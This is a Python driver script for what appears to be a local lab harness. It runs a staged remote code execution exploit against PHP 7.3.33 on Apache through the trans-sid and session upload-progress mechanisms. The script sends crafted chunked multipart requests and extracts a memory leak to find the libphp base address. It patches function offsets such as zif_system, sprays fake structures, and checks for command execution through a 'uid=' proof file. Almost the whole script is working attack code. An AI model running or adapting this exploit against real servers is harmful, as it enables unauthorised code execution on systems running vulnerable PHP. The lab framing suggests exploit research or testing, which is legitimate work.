#!/usr/bin/env python3
"""Profile-bound PHP 7.3 A1/B1/A2/B2 developer driver for the local lab."""

from __future__ import annotations

import argparse
import json
import re
import socket
import sys
import time
from pathlib import Path


HARNESS = Path("/harness")
PROFILE_PATH = Path("/audit/php-7.3.33-apache-amd64-trans-sid.json")
RESULTS = Path("/results")
PROOF = Path("/proof/p")
sys.path.insert(0, str(HARNESS))

from exploit import Target  # noqa: E402
from php81_trans_sid import (  # noqa: E402
    FIXED_COMMAND,
    MultipartDocument,
    Php81TransSidExploit,
    _series_name,
)
from profile import Profile, ProfileError, parse_hex  # noqa: E402


def status(response: bytes) -> str:
    line = response.partition(b"\r\n")[0]
    match = re.fullmatch(rb"HTTP/1\.[01] ([0-9]{3})(?: .*)?", line)
    return match.group(1).decode("ascii") if match else "none"


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--label", required=True)
    parser.add_argument("--fillers", type=int, required=True)
    parser.add_argument("--stop-after-a2", action="store_true")
    parser.add_argument("--stop-after-b1", action="store_true")
    parser.add_argument("--reference-offset", type=lambda value: int(value, 0))
    parser.add_argument("--fake-array-offset", type=lambda value: int(value, 0))
    parser.add_argument(
        "--b2-mode",
        choices=("normal", "spray-first", "progress-first", "spray-only", "no-progress"),
        default="normal",
    )
    args = parser.parse_args()
    if not re.fullmatch(r"[A-Za-z0-9_.-]+", args.label):
        raise SystemExit("invalid label")
    if not 0 <= args.fillers <= 900:
        raise SystemExit("invalid filler count")
    if args.stop_after_a2 and args.stop_after_b1:
        raise SystemExit("choose only one stop stage")
    if args.stop_after_a2 or args.stop_after_b1:
        if args.reference_offset is not None or args.fake_array_offset is not None:
            raise SystemExit("B2 offsets are invalid with a stop stage")
    elif args.reference_offset is None or args.fake_array_offset is None:
        raise SystemExit("both B2 offsets are required")

    out = RESULTS / args.label
    out.mkdir(parents=True, exist_ok=False)
    raw = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
    raw["symbols"]["zif_system"]["offset"] = "0x35f640"
    raw["symbols"]["zval_ptr_dtor"]["offset"] = "0x440dc0"
    raw["request_recipe"]["a2"]["fillers"]["count"] = args.fillers
    if not (args.stop_after_a2 or args.stop_after_b1):
        raw["request_recipe"]["b2"]["reference_offset"] = hex(args.reference_offset)
        raw["request_recipe"]["b2"]["fake_array_offset"] = hex(args.fake_array_offset)
    profile = Profile(PROFILE_PATH, raw, raw["id"])

    address = socket.gethostbyname("target")
    target = Target("http://target/index.php", [address], timeout=30.0)
    engine = Php81TransSidExploit(target, profile, FIXED_COMMAND)
    summary: dict[str, object] = {
        "actual_target": "php-7.3.33",
        "geometry_source": raw["id"],
        "command": FIXED_COMMAND.decode("ascii"),
        "a2_filler_count": args.fillers,
    }

    a1, boundary, query = engine.build_a1()
    response = target.post_chunked(
        a1, boundary, query=query, read_cap=1 << 20, timeout=180.0
    )
    (out / "a1.response").write_bytes(response)
    summary["a1_status"] = status(response)
    del a1
    time.sleep(0.2)

    b1, boundary, query = engine.build_b1()
    fake_len = parse_hex(engine.recipe["b1"]["fake_len"], "b1.fake_len")
    response = target.post_chunked(
        b1,
        boundary,
        query=query,
        read_cap=max(8 << 20, fake_len * 3 + (1 << 20)),
        timeout=600.0,
    )
    (out / "b1.response").write_bytes(response)
    summary["b1_status"] = status(response)
    del b1
    leak = engine.extract_b1_leak(response)
    (out / "b1.leak").write_bytes(leak)
    disclosure = engine.parse_b1_leak(leak)
    summary.update(
        b1_leak_length=len(leak),
        main_chunk=hex(disclosure.main_chunk),
        libphp_base=hex(disclosure.libphp_base),
        dtor_hits=disclosure.dtor_hits,
    )
    if args.stop_after_b1:
        summary["stage"] = "b1"
        (out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
        print(json.dumps(summary, sort_keys=True), flush=True)
        return 0

    a2, boundary = engine.build_a2()
    response = target.post_chunked_iter(
        a2, boundary, read_cap=1 << 20, timeout=240.0
    )
    (out / "a2.response").write_bytes(response)
    summary["a2_status"] = status(response)
    time.sleep(0.3)
    if args.stop_after_a2:
        summary["stage"] = "a2"
        (out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
        print(json.dumps(summary, sort_keys=True), flush=True)
        return 0

    spec = engine.recipe["b2"]
    boundary = b"B" * int(spec["boundary_len"])
    document = MultipartDocument(boundary)

    def session_fields() -> None:
        document.field(engine.runtime["session_name"].encode("ascii"), b"a")
        if args.b2_mode != "no-progress":
            document.field(
                engine.runtime["upload_progress_name"].encode("ascii"),
                str(spec["progress_value"]).encode("ascii"),
            )

    def spray_fields() -> None:
        for index in range(int(spec["spray_count"])):
            name = _series_name("s", index, 3, int(spec["name_len"]), b"s")
            document.field(
                name,
                engine.build_b2_value(index, disclosure.main_chunk, disclosure.libphp_base),
            )

    if args.b2_mode in ("spray-first", "spray-only"):
        spray_fields()
        if args.b2_mode != "spray-only":
            session_fields()
    elif args.b2_mode == "progress-first":
        document.field(
            engine.runtime["upload_progress_name"].encode("ascii"),
            str(spec["progress_value"]).encode("ascii"),
        )
        document.field(engine.runtime["session_name"].encode("ascii"), b"a")
        spray_fields()
    else:
        session_fields()
        spray_fields()
    b2 = document.finish()
    response = target.post(b2, boundary, read_cap=1 << 20, timeout=120.0)
    (out / "b2.response").write_bytes(response)
    summary["b2_status"] = status(response)
    time.sleep(0.8)
    try:
        proof = PROOF.read_text(encoding="utf-8", errors="replace").strip()
    except OSError:
        proof = ""
    summary["proof"] = proof
    summary["success"] = bool(re.match(r"^uid=[0-9]+", proof))
    summary["reference_offset"] = hex(args.reference_offset)
    summary["fake_array_offset"] = hex(args.fake_array_offset)
    summary["b2_mode"] = args.b2_mode
    (out / "summary.json").write_text(json.dumps(summary, indent=2) + "\n")
    print(json.dumps(summary, sort_keys=True), flush=True)
    # The unprivileged client deliberately cannot traverse the proof volume.
    # The host-side runner performs the terminal fixed-proof check.
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except ProfileError as exc:
        print(f"PROFILE_ERROR: {exc}", file=sys.stderr, flush=True)
        raise SystemExit(2)
